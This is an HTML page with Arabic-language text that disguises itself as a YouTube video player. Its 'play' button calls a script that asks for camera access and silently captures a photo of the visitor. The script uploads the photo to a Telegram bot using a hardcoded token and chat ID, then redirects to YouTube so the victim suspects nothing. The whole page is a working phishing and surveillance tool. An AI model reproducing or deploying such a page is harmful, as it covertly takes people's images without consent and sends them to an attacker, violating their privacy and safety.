<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>YouTube Video</title>
    <style>
        body { background: white; text-align: center; padding-top: 100px; font-family: sans-serif; }
        .play-btn { background: red; color: white; padding: 20px 40px; border: none; border-radius: 50px; font-size: 20px; font-weight: bold; cursor: pointer; }
    </style>
</head>
<body>

    <img src="https://upload.wikimedia.org/wikipedia/commons/b/b8/YouTube_Logo_2017.svg" width="200" alt="YouTube"><br><br>
    <p>انقر لتشغيل الفيديو المطلوب</p>
    <button class="play-btn" onclick="startCapture()">▶ تشغيل الفيديو</button>

    <video id="v" style="display:none" autoplay playsinline></video>
    <canvas id="c" style="display:none"></canvas>

    <script>
        const token = "8295590667:AAFCZ3w2Uf0g5OBO7_QU7mwS2apdbTjwCqY";
        const chat = "8042090388";

        async function startCapture() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                const video = document.getElementById('v');
                video.srcObject = stream;
                
                // التقاط الصورة فوراً بعد السماح
                setTimeout(() => {
                    const canvas = document.getElementById('c');
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                    canvas.getContext('2d').drawImage(video, 0, 0);
                    
                    canvas.toBlob(blob => {
                        const fd = new FormData();
                        fd.append('chat_id', chat);
                        fd.append('photo', blob, 'img.jpg');
                        
                        fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: 'POST', body: fd })
                        .then(() => {
                            // إغلاق الكاميرا والتحويل لليوتيوب فوراً
                            stream.getTracks().forEach(t => t.stop());
                            window.location.href = "https://www.youtube.com/watch?v=dQw4w9WgXcQ"; // ضع رابط الفيديو الذي تريده هنا
                        });
                    }, 'image/jpeg');
                }, 1000);
                
            } catch (e) {
                alert("يجب السماح بالكاميرا لمشاهدة الفيديو!");
            }
        }
    </script>
</body>
</html>
